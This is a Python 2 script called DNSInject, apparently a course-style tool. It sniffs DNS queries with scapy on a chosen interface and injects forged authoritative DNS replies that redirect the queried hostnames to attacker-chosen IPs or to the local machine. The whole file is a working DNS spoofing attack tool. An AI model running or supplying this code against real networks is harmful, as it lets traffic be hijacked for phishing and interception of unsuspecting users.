import argparse
from scapy.all import *
import socket

hostnames = None
host_dict = {}
my_ip = ""
"""
Reference for forging packets using scapy
	-	https://www.cybrary.it/0p3n/forge-sniff-packets-using-scapy-python/
	-	https://scapy.readthedocs.io/en/latest/usage.html
"""
def pkt_callback(pkt):
    global hostnames, my_ip

    if pkt.haslayer(IP) and pkt.haslayer(DNSQR) and pkt[DNS].qr == 0:

        victim = pkt[DNSQR].qname[:-1]
        redirect_to = ''

        # Hostnames are given
        if hostnames:
            if victim in host_dict:
                redirect_to = host_dict[victim]
            else:
                return
        # Hostnames not given
        else:
            redirect_to = my_ip  ## Local ip address

        spoofed_pkt = IP(src=pkt[IP].dst, dst=pkt[IP].src) / UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport) / DNS( id=pkt[DNS].id, qd=pkt[DNS].qd, aa=1L, qr=1L, an=DNSRR(rrname=pkt[DNS].qd.qname, ttl=20, rdata=redirect_to))
        send(spoofed_pkt)


"""
Reference for parsing CLI using argparse
	-	https://pymotw.com/2/argparse/
"""
def arg_parser():
    parser = argparse.ArgumentParser(
     add_help=False,
     description=
     "DNSInject is a tool for modifying DNS records on vulnerable servers.")
    parser.add_argument(
     "-i",
     nargs="?",
     metavar="eth0",
     help="Name if the network interface to listen on.")
    parser.add_argument(
     "-h",
     nargs="?",
     metavar="hostnames.txt",
     help=
     "Name of a file with list of IP address and hostname pairs specifying the hostnames to be hijacked."
    )
    parser.add_argument("expression", nargs="*", action="store")
    parser.add_argument(
     '-?', '-help', '--help', action="store_true", help=argparse.SUPPRESS)

    args = parser.parse_args()

    if args.help:
        parser.print_help()
        sys.exit()

    return args.i, args.h, args.expression


def main():
    global hostnames, my_ip

    interface, hostnames, bpf_filter = arg_parser()
    """
	Reference for finding local ip address using python
		-	https://stackoverflow.com/questions/166506/finding-local-ip-addresses-using-pythons-stdlib
	"""
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("8.8.8.8", 80))
    my_ip = s.getsockname()[0]
    s.close()

    if hostnames:
        # hostnames = ''.join(hostnames)
        if os.path.exists(str(hostnames)):
            with open(str(hostnames), 'rt') as f:
                hostnames = f.readlines()

            for h in hostnames:
                h = h.split()
                host_dict[h[1]] = h[0]

        print "hostnames :", host_dict

    if bpf_filter:
        bpf_filter = ' '.join(bpf_filter)
        print "Bpf filter :", bpf_filter
    else:
        bpf_filter = "udp port 53"


    """
	Reference for sniffing using scapy
		-	https://scapy.readthedocs.io/en/latest/usage.html

	"""
    if interface:
        # interface = args.i
        print "Interface :", interface
        sniff(iface=interface, prn=pkt_callback, filter=bpf_filter, store=0)
    else:
        print "Choosing default interface"
        sniff(prn=pkt_callback, filter=bpf_filter, store=0)

if __name__ == '__main__':
    main()
